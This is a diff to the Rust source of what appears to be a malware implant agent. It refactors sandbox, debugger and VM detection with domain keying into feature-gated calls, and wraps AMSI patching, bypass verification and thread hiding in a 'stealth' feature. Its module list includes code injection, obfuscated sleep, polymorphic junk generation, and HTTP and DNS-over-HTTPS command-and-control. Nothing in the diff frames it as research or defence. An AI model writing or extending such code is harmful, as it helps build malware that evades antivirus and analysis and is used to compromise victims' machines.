@@ -112,10 +112,16 @@ impl Agent {
         // side-effectful hooks are applied.  If the environment is hostile
         // (debugger, wrong domain, VM when refuse_in_vm is set) the agent
         // enters a dormant state without having modified any process state.
+        #[cfg(feature = "env-validation")]
         {
             let decision = {
                 let cfg = self.config.lock().await;
-                env_check::enforce(cfg.required_domain.as_deref(), cfg.refuse_in_vm)
+                env_check::enforce(
+                    cfg.required_domain.as_deref(),
+                    cfg.refuse_when_debugged,
+                    cfg.refuse_in_vm,
+                    cfg.sandbox_score_threshold,
+                )
             };
 
             if decision.report.ld_preload_set {
@@ -146,7 +152,12 @@ impl Agent {
                     }
                     let recheck = {
                         let cfg = self.config.lock().await;
-                        env_check::enforce(cfg.required_domain.as_deref(), cfg.refuse_in_vm)
+                        env_check::enforce(
+                            cfg.required_domain.as_deref(),
+                            cfg.refuse_when_debugged,
+                            cfg.refuse_in_vm,
+                            cfg.sandbox_score_threshold,
+                        )
                     };
                     if !recheck.refuse {
                         info!("environment re-check passed; resuming normal operation");
@@ -179,12 +190,17 @@ impl Agent {
         // Applying them before validation would produce side-effects (AMSI
         // patches, thread hiding) even on hostile hosts where the agent should
         // refuse to run.
-        log::debug!("Applying evasion layers");
-        unsafe { crate::evasion::patch_amsi(); }
-        crate::amsi_defense::orchestrate_layers();
-        crate::amsi_defense::verify_bypass();
-        crate::evasion::hide_current_thread();
-        log::debug!("Evasion layers applied");
+        #[cfg(feature = "stealth")]
+        {
+            log::debug!("Applying evasion layers");
+            unsafe {
+                crate::evasion::patch_amsi();
+            }
+            crate::amsi_defense::orchestrate_layers();
+            crate::amsi_defense::verify_bypass();
+            crate::evasion::hide_current_thread();
+            log::debug!("Evasion layers applied");
+        }
 
         // Optimize hot functions at startup
         #[cfg(feature = "unsafe-runtime-rewrite")]
@@ -308,11 +324,11 @@ impl Agent {
     }
 }
 
-pub mod evasion;
-pub mod stub;
 pub mod amsi_defense;
 #[cfg(windows)]
 pub mod callback_exec;
+pub mod evasion;
+pub mod stub;
 
 // Inserting some random junk compilation artifacts (FR-2)
 pub fn polymorph() {
@@ -323,5 +339,5 @@ pub mod injection;
 
 pub mod obfuscated_sleep;
 
-pub mod c2_http;
 pub mod c2_doh;
+pub mod c2_http;
